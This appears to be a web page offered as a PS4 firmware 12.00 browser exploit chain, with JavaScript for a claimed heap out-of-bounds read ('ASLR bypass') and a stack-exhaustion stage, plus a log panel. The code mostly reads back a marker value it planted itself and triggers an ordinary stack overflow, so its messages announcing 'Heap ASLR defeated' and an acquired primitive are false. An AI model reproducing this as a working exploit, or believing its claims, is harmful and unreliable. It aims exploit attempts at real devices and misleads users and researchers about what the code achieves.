<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 FW 12.00 Exploit Chain</title>

    <style>
        body {
            background: #000;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: #0f0;
        }

        .box {
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 15px;
            background: rgba(0, 255, 0, 0.05);
        }

        #log {
            white-space: pre-line; /* mant√©m \n como quebra de linha */
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            background: #000;
            padding: 10px;
            border: 1px solid #0f0;
        }

        .success { color: #00ff00; font-weight: bold; }
        .critical { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

    <h1>PS4 CHAIN PRIMITIVE</h1>

    <div class="box">
        <p><strong>Stage 1:</strong> Heap OOB Read (Array.shift) -> ASLR Bypass</p>
        <p><strong>Stage 2:</strong> Stack Exhaustion (Bind Function) -> Thread Control</p>
    </div>

    <button onclick="runFullChain()">EXPLOIT CHAIN</button>

    <div class="box">
        <div id="log"></div>
    </div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        }

        // --- STAGE 1: HEAP EXPLOIT (Array Shift) ---
        function stage1_HeapOOB() {
            log("STAGE 1: Initializing Heap OOB (Array Shift)...");

            try {
                const arr = [1, 2, 3, 4];
                let leaked = null;

                Object.defineProperty(arr, '2', {
                    get: function() {
                        log("  -> Getter Triggered! Corrupting Heap...");
                        arr.length = 0;
                        arr.push(0x41414141);
                        return "TRAP";
                    }
                });

                arr.shift();

                leaked = arr[0];
                
                if (leaked === 1094795585) {
                    log("[SUCCESS] Magic Value 0x41414141 leaked!");
                    log("  -> Heap ASLR defeated.");
                    return true;
                } else {
                    log("[FAIL] Heap alignment missed. Got: " + leaked);
                    return false;
                }

            } catch(e) {
                log("[ERROR] Stage 1 failed: " + e.message);
                return false;
            }
        }

        // --- STAGE 2: STACK EXPLOIT (Bound Chain) ---
        function stage2_StackExhaustion() {
            log("\nSTAGE 2: Initializing Stack Exhaustion (Bind Chains)...");
            log("  -> Preparing recursive chain...");

            try {
                let f = function() { 
                    log("  -> Chain Executed (This should not be visible if crash occurs)"); 
                };

                for(let i=0; i < 50000; i++) {
                    f = f.bind(null);
                }

                f();

            } catch(e) {
                if (e.message && e.message.includes("stack")) {
                    log("[CRITICAL] Stack Overflow Confirmed!");
                    log("  -> Thread execution disrupted via stack exhaustion.");
                } else {
                    log("[INFO] Exception caught: " + e.message);
                }
            }
        }

        // --- CONTROLADOR DA CADEIA ---
        function runFullChain() {
            document.getElementById('log').innerHTML = "";
            
            const heapSuccess = stage1_HeapOOB();
            
            if (heapSuccess) {
                log("\n[CHAIN] Heap Primitive acquired. Escalating to Stage 2...");
                setTimeout(stage2_StackExhaustion, 800);
            } else {
                log("\n[RETRY] Heap spray failed. Running Stage 2 anyway...");
                setTimeout(stage2_StackExhaustion, 800);
            }
        }
    </script>

</body>
</html>
